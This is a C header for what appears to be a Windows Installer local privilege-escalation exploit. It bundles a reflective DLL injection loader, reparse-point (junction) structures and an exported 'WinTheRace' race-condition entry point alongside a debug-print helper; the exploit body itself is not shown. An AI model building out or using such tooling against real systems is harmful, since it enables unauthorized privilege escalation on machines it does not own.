#ifndef WINDOWS_INSTALLER_PRIVESC_H
#define WINDOWS_INSTALLER_PRIVESC_H

#ifdef WINDOWSINSTALLERPRIVESC_EXPORTS
#define WINDOWSINSTALLERPRIVESC_API __declspec(dllexport)
#else
#define WINDOWSINSTALLERPRIVESC_API __declspec(dllimport)
#endif

#define REFLECTIVEDLLINJECTION_VIA_LOADREMOTELIBRARYR
#define REFLECTIVEDLLINJECTION_CUSTOM_DLLMAIN
#include "../../../ReflectiveDLLInjection/dll/src/ReflectiveLoader.c"
#include <winioctl.h>
#include <stdio.h>
#include <strsafe.h>

//#ifdef _DEBUG
#define DBGPRINT(szFormatString, ...) _DBGPRINT(__FUNCTIONW__, __LINE__, szFormatString, __VA_ARGS__)
#define DBGPRINT_AND_BREAK(szFormatString, ...) { DBGPRINT(szFormatString, __VA_ARGS__); break; }

#ifdef UNICODE
VOID _DBGPRINT(LPCWSTR kwszFunction, INT iLineNumber, LPCWSTR kwszDebugFormatString, ...) \
{
	INT cbFormatString = 0;
	va_list args;
	PWCHAR wszDebugString = NULL;
	size_t st_Offset = 0;
	DWORD dwError = GetLastError();
	LPVOID lpErrorMsgBuf = NULL;
	DWORD cbErrorMsgBuf;

	va_start(args, kwszDebugFormatString);

	cbFormatString = _scwprintf(L"[%s:%d] ", kwszFunction, iLineNumber) * sizeof(WCHAR);
	cbFormatString += _vscwprintf(kwszDebugFormatString, args) * sizeof(WCHAR) + 2 + 2; // L'\n\0' 
	if (dwError)
	{
		cbErrorMsgBuf = FormatMessageW(
			FORMAT_MESSAGE_ALLOCATE_BUFFER | FORMAT_MESSAGE_FROM_SYSTEM | FORMAT_MESSAGE_IGNORE_INSERTS,
			NULL,
			dwError,
			MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT),
			(LPWSTR)&lpErrorMsgBuf,
			0,
			NULL
		);
		while (((LPWSTR)lpErrorMsgBuf)[cbErrorMsgBuf - 1] == L'\n' || ((LPWSTR)lpErrorMsgBuf)[cbErrorMsgBuf - 1] == L'\r')
			cbErrorMsgBuf--;
		((LPWSTR)lpErrorMsgBuf)[cbErrorMsgBuf] = L'\0';
		cbFormatString += _scwprintf(L" (Error %d: %s)", dwError, (LPCTSTR)lpErrorMsgBuf) * sizeof(WCHAR);
	}

	/* Depending on the size of the format string, allocate space on the stack or the heap. */
	wszDebugString = (PWCHAR)_malloca(cbFormatString);
	if (!wszDebugString)
	{
		OutputDebugStringW(L"Could not allocate memory for _DBGPRINT");
		return;
	}
	/* Populate the buffer with the contents of the format string. */
	StringCbPrintfW(wszDebugString, cbFormatString, L"[%s:%d] ", kwszFunction, iLineNumber);
	StringCbLengthW(wszDebugString, cbFormatString, &st_Offset);
	StringCbVPrintfW(&wszDebugString[st_Offset / sizeof(WCHAR)], cbFormatString - st_Offset, kwszDebugFormatString, args);

	if (lpErrorMsgBuf)
	{
		StringCbLengthW(wszDebugString, cbFormatString, &st_Offset);
		StringCbPrintfW(&wszDebugString[st_Offset / sizeof(WCHAR)], cbFormatString - st_Offset, L" (Error %d: %s)", dwError, (LPCTSTR)lpErrorMsgBuf);
	}
	StringCbLengthW(wszDebugString, cbFormatString, &st_Offset);
	StringCbPrintfW(&wszDebugString[st_Offset / sizeof(WCHAR)], cbFormatString - st_Offset, L"\n");

	OutputDebugStringW(wszDebugString);

	LocalFree(lpErrorMsgBuf);
	_freea(wszDebugString);
	SetLastError(0);

	va_end(args);
}
#else // UNICODE
VOID _DBGPRINT(LPCSTR kszFunction, INT iLineNumber, LPCSTR kszDebugFormatString, ...) \
{
	INT cbFormatString = 0;
	va_list args;
	PCHAR szDebugString = NULL;
	size_t st_Offset = 0;

	va_start(args, kszDebugFormatString);

	cbFormatString = _scprintf("[%s:%d] ", kszFunction, iLineNumber) * sizeof(CHAR);
	cbFormatString += _vscprintf(kszDebugFormatString, args) * sizeof(CHAR) + 1;

	/* Depending on the size of the format string, allocate space on the stack or the heap. */
	szDebugString = (PCHAR)_malloca(cbFormatString);
	if (!szDebugString)
	{
		OutputDebugStringA("Could not allocate memory for _DBGPRINT");
		return;
	}
	/* Populate the buffer with the contents of the format string. */
	StringCbPrintfA(szDebugString, cbFormatString, "[%s:%d] ", kszFunction, iLineNumber);
	StringCbLengthA(szDebugString, cbFormatString, &st_Offset);
	StringCbVPrintfA(&szDebugString[st_Offset / sizeof(CHAR)], cbFormatString - st_Offset, kszDebugFormatString, args);

	OutputDebugStringA(szDebugString);

	_freea(szDebugString);
	va_end(args);
}

#endif // UNICODE
//#else
//#define DBGPRINT( kwszDebugFormatString, ... ) ;;
//#define DBGPRINT_AND_BREAK(szFormatString, ...) { break; };
//#endif

typedef struct _REPARSE_DATA_BUFFER {
	ULONG  ReparseTag;
	USHORT ReparseDataLength;
	USHORT Reserved;
	union {
		struct {
			USHORT SubstituteNameOffset;
			USHORT SubstituteNameLength;
			USHORT PrintNameOffset;
			USHORT PrintNameLength;
			ULONG Flags;
			WCHAR PathBuffer[1];
		} SymbolicLinkReparseBuffer;
		struct {
			USHORT SubstituteNameOffset;
			USHORT SubstituteNameLength;
			USHORT PrintNameOffset;
			USHORT PrintNameLength;
			WCHAR PathBuffer[1];
		} MountPointReparseBuffer;
		struct {
			UCHAR  DataBuffer[1];
		} GenericReparseBuffer;
	} DUMMYUNIONNAME;
} REPARSE_DATA_BUFFER, * PREPARSE_DATA_BUFFER;

#define REPARSE_DATA_BUFFER_HEADER_LENGTH FIELD_OFFSET(REPARSE_DATA_BUFFER, GenericReparseBuffer.DataBuffer)


#ifdef __cplusplus
	extern "C" WINDOWSINSTALLERPRIVESC_API DWORD WinTheRace(LPVOID lpParam);
#else
	WINDOWSINSTALLERPRIVESC_API DWORD WinTheRace(LPVOID lpParam);
#endif

#endif //WINDOWS_INSTALLER_PRIVESC_H
